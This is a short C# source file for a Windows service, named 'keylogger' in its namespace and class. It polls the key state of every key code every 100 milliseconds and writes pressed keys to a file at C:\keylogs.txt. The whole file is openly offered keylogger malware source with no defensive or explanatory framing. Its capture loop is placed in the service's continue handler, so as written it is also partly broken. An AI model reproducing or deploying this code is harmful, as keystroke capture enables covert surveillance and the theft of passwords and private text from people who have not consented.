using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;

namespace keylogger
{
    public partial class keylog : ServiceBase
    {
        private StreamWriter writer;

        public keylog()
        {
            InitializeComponent();
        }

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        protected override void OnStart(string[] args)
        {
            writer = new StreamWriter("C:\\keylogs.txt");
        }

        protected override void OnContinue()
        {
            while (true)
            {
                Thread.Sleep(100); // checks every 100 ms
                for (Int32 i = 0; i < 255; i++) // for every character
                {
                    int state = GetAsyncKeyState(i); // check if pressed or not pressed
                    if (state == 1 || state == -32767)
                    {
                        writer.WriteAsync((char)i); // write to file
                    }
                }
            }

        }
        protected override void OnStop()
        {
            writer.Close();
        }
    }
}
